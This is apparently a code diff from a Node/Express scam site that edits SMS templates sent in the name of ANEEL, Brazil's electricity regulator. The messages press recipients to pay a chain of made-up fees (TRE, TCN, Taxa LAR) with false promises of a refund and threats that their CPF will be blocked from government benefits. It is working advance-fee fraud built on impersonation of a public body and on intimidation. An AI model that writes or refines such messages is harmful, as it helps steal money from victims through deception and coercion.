@@ -335,7 +335,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
       
       switch (pagina) {
         case "/pagamento":
-          mensagem = `ANEEL Informa: ${primeiroNome}, a TRE foi gerada. Pague em até 20 min ou seu CPF será bloqueado para benefícios do governo por até 5 anos.`;
+          mensagem = `ANEEL Informa: ${primeiroNome}, Sua TRE foi gerada. Pague em ate 20 minutos ou seu CPF sera bloqueado preventivamente, impedindo beneficios do governo por ate 5 anos.`;
           break;
           
         case "/taxa-complementar":
@@ -343,23 +343,23 @@ export async function registerRoutes(app: Express): Promise<Server> {
           break;
           
         case "/pagamento-tcn":
-          mensagem = `ANEEL Informa: ${primeiroNome}, a TCN foi gerada. O pagamento e obrigatorio para aprovar e liberar sua restituicao de R$ ${valorFormatado}. Sem ele, o processo sera cancelado.`;
+          mensagem = `ANEEL Informa: ${primeiroNome}, Sua TCN foi gerada. O pagamento eh obrigatorio para liberar sua restituicao. Sem o pagamento, o processo sera CANCELADO.`;
           break;
           
         case "/taxa-lar":
-          mensagem = `ANEEL Informa: ${primeiroNome}, O pagamento da TCN foi confirmado. Sua solicitacao foi aprovada e sua restituicao no valor de R$ ${valorFormatado} esta sendo processada.`;
+          mensagem = `ANEEL Informa: ${primeiroNome}, O pagamento da TCN foi confirmado. Sua solicitacao foi aprovada e sua restituicao esta sendo processada.`;
           break;
           
         case "/pagamento-lar":
-          mensagem = `ANEEL Informa: ${primeiroNome}, A Taxa LAR é para quem nao quer esperar 15 dias. Para receber sua restituicao de R$ ${valorFormatado} em ate 60 min, pague agora mesmo.`;
+          mensagem = `ANEEL Informa: ${primeiroNome}, sua restituicao leva ate 15 dias uteis para ser depositada. Pague a Taxa de Liberacao Acelerada (LAR) para receber em 60min.`;
           break;
           
         case "/sucesso":
-          mensagem = `ANEEL Informa: ${primeiroNome}, O pagamento da Taxa LAR foi confirmado com sucesso. Sua restituicao no valor de R$ ${valorFormatado} sera depositada em ate 60 minutos.`;
+          mensagem = `ANEEL Informa: ${primeiroNome}, O pagamento da LAR foi confirmado. Em ate 60min o valor sera enviado para sua chave Pix CPF ${cpfFormatado}.`;
           break;
           
         case "/sucesso-padrao":
-          mensagem = `ANEEL Informa: ${primeiroNome}, Voce escolheu aguardar 15 dias. Essa é sua ultima chance de pagar a Taxa LAR e receber seu valor de R$ ${valorFormatado} em ate 60 minutos. Nao perca!`;
+          mensagem = `ANEEL Informa: ${primeiroNome}, Voce escolheu aguardar 15 dias. Essa eh sua ultima chance de pagar a Taxa LAR e receber seu valor em ate 60 minutos.`;
           break;
           
         default:
